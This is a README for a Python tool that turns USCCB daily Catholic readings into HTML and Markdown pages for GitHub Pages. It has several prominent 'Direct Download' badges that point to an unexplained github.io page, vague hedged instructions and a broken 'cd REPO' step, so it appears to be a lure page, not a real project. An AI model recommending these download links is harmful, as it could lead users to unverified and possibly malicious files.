# Catholic Liturgy Tools - Catholic Liturgy Content Generator 2026

> **Catholic Liturgy Tools is a Python CLI for retrieving daily readings from USCCB.org, generating liturgical messages, and preparing static HTML and Markdown content for GitHub Pages.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fparker879/catholic-liturgy-tools-win-45447?style=flat-square)](https://github.com/fparker879/catholic-liturgy-tools-win-45447)

---

<p align="center">
  <a href="https://fparker879.github.io/catholic-liturgy-tools-win-45447/">
    <img src="https://img.shields.io/badge/Download-Catholic%20Liturgy%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Catholic Liturgy Tools">
  </a>
</p>

> **[Direct Download - Catholic Liturgy Tools Latest](https://fparker879.github.io/catholic-liturgy-tools-win-45447/)**

---

[Download Latest Build](https://fparker879.github.io/catholic-liturgy-tools-win-45447/)

---

## About Catholic Liturgy Tools

Catholic Liturgy Tools is a Python-based content generator for daily Catholic liturgy workflows. It retrieves daily readings from USCCB.org and turns them into daily messages and publishable HTML or Markdown files with frontmatter.

The project is intended for people maintaining a liturgical content site, devotional archive, or automated publishing workflow. It can create reverse-chronological indexes, write results to selected output directories, and connect the generation process with GitHub Actions and GitHub Pages.

---

## Features

- Generate daily Catholic liturgical messages.
- Fetch daily readings from USCCB.org.
- Produce HTML and Markdown files with frontmatter.
- Build indexes ordered from newest content to oldest.
- Configure the date used for content generation.
- Select the destination directory for generated files.
- Trigger GitHub Actions publishing workflows.
- Check the deployment status of a GitHub Pages site.

---

## Installation

Clone the repository and enter its directory:

```bash
git clone https://github.com/fparker879/catholic-liturgy-tools-win-45447.git
cd REPO
```

Create or activate a Python environment if your workflow uses one, then install the project's documented dependencies.

To review the available command-line options before the first run:

```bash
python -m catholic_liturgy_tools --help
```

If the project is distributed as a script rather than a Python module, run the provided entry point with `--help` instead.

---

## Usage

A typical workflow consists of the following steps:

1. Choose the date for the liturgical content.
2. Retrieve the corresponding readings from USCCB.org.
3. Generate the daily message and output files.
4. Build or refresh the reverse-chronological index.
5. Publish the generated content through GitHub Actions and GitHub Pages.

For command-specific options, start with the built-in help:

```bash
python -m catholic_liturgy_tools --help
```

A date- and output-specific run can be organized using options in this general form:

```bash
python -m catholic_liturgy_tools --date YYYY-MM-DD --output-dir path/to/output
```

Use the command names and option spelling exposed by the installed version of the tool.

---

## Configuration

Catholic Liturgy Tools supports configurable dates and output directories. Keep those values in the project's supported configuration file or pass them through the CLI when running a generation job.

A representative configuration might look like this:

```yaml
date: "YYYY-MM-DD"
output_dir: "path/to/output"
```

GitHub Actions settings can be used to automate generation and publishing. Review the repository workflow files for the expected triggers, deployment checks, and publishing steps.

---

## Requirements

- Python runtime compatible with the installed project version.
- Network access when retrieving readings from USCCB.org.
- A writable output directory for generated HTML, Markdown, and index files.
- A GitHub repository when using GitHub Actions or GitHub Pages publishing.
- GitHub Pages enabled for hosted static content.
- Sufficient storage for the generated content archive and site files.

---

## FAQ

### Who is Catholic Liturgy Tools for?

It is designed for maintainers of Catholic liturgy websites, daily reading archives, and automated content-publishing workflows.

### Can I generate content for a specific date?

Yes. The tool supports configurable dates, allowing a workflow to request the day it needs to process.

### Where are generated files written?

The destination can be configured with an output directory, either through the project's configuration approach or its CLI options.

### Does it publish directly to GitHub Pages?

It supports GitHub Actions and GitHub Pages workflows, including publishing triggers and deployment-status checks. The exact setup depends on the repository's workflow configuration.

### What should I check if generation fails?

Confirm that Python is available, dependencies are installed, the output directory is writable, and the runtime can reach USCCB.org. For publishing issues, inspect the relevant GitHub Actions run and Pages deployment status.

### How can I find the available commands?

Run the CLI help command for the installed version:

```bash
python -m catholic_liturgy_tools --help
```

### How are updates handled?

Pull the latest repository changes, review any configuration or workflow updates, and rerun the installation steps appropriate to the new version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
